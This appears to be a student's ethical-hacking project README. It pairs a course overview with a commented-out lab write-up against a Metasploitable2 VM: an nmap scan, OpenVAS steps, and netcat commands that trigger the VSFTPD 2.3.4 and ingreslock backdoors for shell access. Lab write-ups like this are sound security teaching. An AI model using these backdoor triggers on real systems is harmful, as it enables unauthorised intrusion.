
# Pentesting Project | Ethical Hacking Project

This pentesting project is designed to provide a comprehensive introduction to the field of ethical hacking. It will cover a wide range of topics, including:

- Network scanning
- Vulnerability assessment
- Exploitation techniques

By the end of this project, you will have a solid understanding of the tools and techniques used by hackers, as well as the knowledge and skills needed to identify and mitigate potential vulnerabilities in your own systems.

## Service and Vulnerability Detection

This section of the project will focus on the detection of services and vulnerabilities on target systems. You will learn how to use various scanning tools and techniques to identify open ports, services, and software versions on a target system. Additionally, you will learn how to use vulnerability scanners to identify known vulnerabilities in the software running on a target system. This will include both commercial and open-source scanners.

## Exploitation

Once you have identified potential vulnerabilities in a target system, the next step is to exploit them. In this section, you will learn how to use various exploitation frameworks and tools to gain access to a target system. You will also learn how to use social engineering and phishing techniques to trick users into giving you access to their systems.

## Post Exploitation

After gaining access to a target system, the next step is to maintain and expand that access. In this section, you will learn how to use various post-exploitation frameworks and tools to gather information about the target system, move laterally through a network, and establish persistent access. Additionally, you will learn how to use common techniques to evade detection and hide your presence on the target system.

## Web Pentesting

This section of the project will focus on web application security. You will learn how to identify and exploit common web application vulnerabilities, such as SQL injection and cross-site scripting (XSS). Additionally, you will learn how to use various web application scanners and manual testing techniques to identify vulnerabilities in web applications.

## Playing picoCTF

In this section of the project, you will put your new skills to the test by playing picoCTF, a capture the flag (CTF) competition designed to teach the basics of computer security. You will learn how to solve various types of security challenges, such as cryptography, reverse engineering, and web security.

<!---
## Hosts IP Addresses
***Windows 7: 192.168.1.101/24 <br>
Kali Linux: 192.168.1.102/24 <br>
Metasploitable2: 192.168.1.103/24***<br>

## Table of contents

### Task 1: General Hacking Capability
1.1 Cryptogram <br>
1.2 Matchstick Puzzle <br>

### Task 2: Service and Vulnerability Detection
2.1 nmap<br>
2.2 OpenVas

### Task 3: Exploitation
3.1 Services: Backdoors <br>
3.2 distcc Remote Code Execution Vulnerability

### Task 4: Post Exploitation
4.1 Escalate privilege

### Task 5: Web Pentesting
5.1 The SQLI page <br>
5.2 The Stored XSS page

### Task 6: picoCTF

## Task 1: General Hacking Capability

### 1.1 Cryptogram
The objective of this task is to decrypt the hidden message using the given letters found under each box. Provided that the letter “Q” is “T”, we can logically assume the first word is “THERE”. From there, my approach was to guess the word with the smallest letters in length, like 3 characters, that also has the same repeating letter with a few other similar words. Then, I made a list of found letters to substitute them and check my logic later.

Halfway through the solving.
Fully decrypted text is shown in the picture. The quote is "There are so many opportunities in life that the loss of two or three capabilities is not debilitative".

### 1.2 Matchstick Puzzle
This is the only mathematical way I came up with.

## Task 2: Service and Vulnerability Detection

### 2.1 nmap
Nmap stands for Network Mapper which is an open-source tool frequently used by the system and network administrators for network discovery, security auditing, network inventory, managing service upgrade schedules, and monitoring host or service uptime (Lyon, N.D, https://nmap.org/)
The objective of this task is to learn what services are running on TCP port 8787. So, to achieve this I used Nmap. information by entering the following command: <br>

```sudo nmap -sV -p 8787 192.168.1.103``` <br>

result:<br>
The outcome depicts that port 8787 of host 192.168.1.103 is running the service DRB located in folder /usr/lib/ruby/1.8/drb with the version Ruby DRb RMI (Ruby 1.8).

### 2.2 OpenVas
The objective of this task is to scan the requested target, Metasploitable2 VM and generate a vulnerability report. So, I used OpenVAS to scan all TCP ports of the target machine and produced a vulnerability report. 

The following steps are implemented to accomplish this task:
- Create a port list, target and task.

Steps list:
1. Under the Configuration tab, click Ports Lists.
2. Click the Star Icon (on the top left of the screen) to create a New Ports List.
3. Fill out the form with the correct details and click Create.
4. The created port list should appear on the list, as shown below.

5. Under the Configuration tab, click Targets.
6. Click the Star Icon (on the top left of the screen) to create a New Target.
7. Fill out the form with the correct details and click Create.
8. The created target should appear on the list, as shown below.

9. Click Tasks under Scans tab
10. Click the Star Icon (on the top left of the screen) to create a New Task.
11. Fill out the details and leave the rest as default, then click Create.
12. The created task should appear on the list, as shown below.

13. Run the scan.
14. Once done, click on Done to show scan results.
15. Download the results by selecting the output file type and clicking the Green Arrow to proceed with the downloading.

B. Report 1 Result Overview 
Report 2 Result Overview
According to these reports, it can be drawn that Report 1 contains 4 more vulnerable ports, with the severity 'High', than Report 2. Those ports are ports 6667, 32980 and 8180.

Port 6667: 
Port 32980: 
Port 8180: 

## Task 3: Exploitation 

### 3.1 Services: Backdoors 
This task involves the use of exploitation to gain access to the target machine. The objective is to use VSFTPD v2.3.4 backdoor in part A. Very Secure FTP Daemon (VSFTPD) is an FTP server for UNIX- like systems including Linux which has been compromised when an unknown party has uploaded a malicious version of 2.3.4 which contains a backdoor.

The following steps will illustrate how I used nc to establish a backdoor as penetrated below.

Backdoor VSFTPD v2.3.4
Steps list:
1. nc to Metasploitable2 VM on port 21: 
nc 192.168.1.103 21
2. Login as user backdoored:) :
user backdoored:)
3. Type invalid as the password:
pass invalid
4. Press CTRL + ] to escape login and quit nc
5. nc to Metasploitable2 VM on port 6200
nc 192.168.1.103 6200
Proof of exploit
- id
- ip addr show dev eth0
- hostname

### B. Ingreslock Backdoor using Netcat
This section will illustrate the ingreslock backdoor that listens on port 1524 on Kali. But for this part, I utilised Netcat, which is famous for being “the Swiss Army knife” in networking tools. Netcat, or nc, is a dependable back-end device that can establish a connection (UDP or TCP) between two computers. Therefore, files can be transferred, and commands can remotely be executed on the target device.
The following are the steps used to accomplish this task:
1. Netcat into Metasploitable2 VM on port 1524:
2. netcat 192.168.1.103 1524
Proof exposition:
1. whoami
2. ip a show dev eth0
3. pwd

--->
